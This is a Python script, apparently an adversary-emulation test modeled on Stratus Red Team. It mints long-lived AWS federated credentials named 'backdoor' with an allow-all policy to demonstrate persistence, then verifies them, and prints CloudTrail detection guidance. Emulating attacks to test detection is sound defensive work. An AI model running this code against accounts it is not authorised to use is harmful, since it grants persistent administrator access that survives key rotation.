"""
Technique : aws.persistence.sts-federation-token
Tactic    : Persistence (T1550.001)
Source    : https://stratus-red-team.cloud/attack-techniques/AWS/aws.persistence.sts-federation-token/

Pre-requisites:
  - Credentials must belong to an IAM user (not a role).
    sts:GetFederationToken is not available to assumed-role sessions.

How the attack works:
  An attacker with compromised IAM user credentials calls sts:GetFederationToken
  to mint a set of federated credentials valid for up to 36 hours.  Even if the
  original access keys are rotated, the federated session remains active until
  it naturally expires.  The minted token can be used from anywhere.

Detection signal:
  - sts:GetFederationToken in CloudTrail, especially with Name containing
    suspicious values ("backdoor", "admin", etc.).
  - Subsequent API calls from the federated session identity
    (userType = FederatedUser in CloudTrail).

Revert:
  - None required. Federated tokens expire naturally (max 36 hours).
  - To immediately revoke: attach DenyAll inline policy to the source IAM user.
"""

import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

import json

import boto3
from botocore.exceptions import ClientError


# ── Constants ─────────────────────────────────────────────────────────────────

FEDERATION_NAME  = "backdoor"
DURATION_SECONDS = 129600    # 36 hours (maximum for IAM user)

ADMIN_POLICY = json.dumps({
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": "*",
            "Resource": "*",
        }
    ],
})


# ── Helpers ───────────────────────────────────────────────────────────────────

def banner(msg: str) -> None:
    print(f"\n{'=' * 60}")
    print(f"  {msg}")
    print(f"{'=' * 60}")


# ── Main ──────────────────────────────────────────────────────────────────────

def main() -> None:
    session    = boto3.Session()
    sts_client = session.client("sts")

    # ── Step 1: Mint federated token ─────────────────────────────────────────
    banner("Step 1 — Mint long-lived federated credentials (GetFederationToken)")
    try:
        response = sts_client.get_federation_token(
            Name=FEDERATION_NAME,
            Policy=ADMIN_POLICY,
            DurationSeconds=DURATION_SECONDS,
        )
    except ClientError as exc:
        code = exc.response["Error"]["Code"]
        if code == "AccessDenied":
            print(f"  [!] AccessDenied — sts:GetFederationToken requires IAM user credentials.")
            print("      If running with an assumed role, this will always fail.")
        else:
            print(f"  [!] Unexpected error: {exc}")
        return

    creds = response["Credentials"]
    federated_user = response.get("FederatedUser", {})

    print(f"  [+] Federated token minted!")
    print(f"  [+] FederatedUser ARN : {federated_user.get('Arn', 'N/A')}")
    print(f"  [+] AccessKeyId       : {creds['AccessKeyId']}")
    print(f"  [+] Expiration        : {creds['Expiration']}")
    print(f"  [!] CloudTrail event: sts:GetFederationToken")

    # ── Step 2: Prove access using federated creds ────────────────────────────
    banner("Step 2 — Prove access using federated credentials (GetCallerIdentity)")
    federated_session = boto3.Session(
        aws_access_key_id=creds["AccessKeyId"],
        aws_secret_access_key=creds["SecretAccessKey"],
        aws_session_token=creds["SessionToken"],
    )
    fed_sts = federated_session.client("sts")
    try:
        identity = fed_sts.get_caller_identity()
        print(f"  [+] Verified identity as federated user:")
        print(f"      UserId  : {identity['UserId']}")
        print(f"      Arn     : {identity['Arn']}")
        print(f"      Account : {identity['Account']}")
    except ClientError as exc:
        print(f"  [!] GetCallerIdentity failed: {exc}")

    banner("Complete")
    print("CloudTrail events: sts:GetFederationToken, sts:GetCallerIdentity")
    print("\nDetection guidance:")
    print("  Alert when sts:GetFederationToken is called with a broad inline")
    print("  policy or from a non-admin principal.  Monitor subsequent API")
    print("  calls where userType=FederatedUser in CloudTrail.")
    print("\nNote: Token expires automatically — no manual cleanup needed.")


if __name__ == "__main__":
    main()
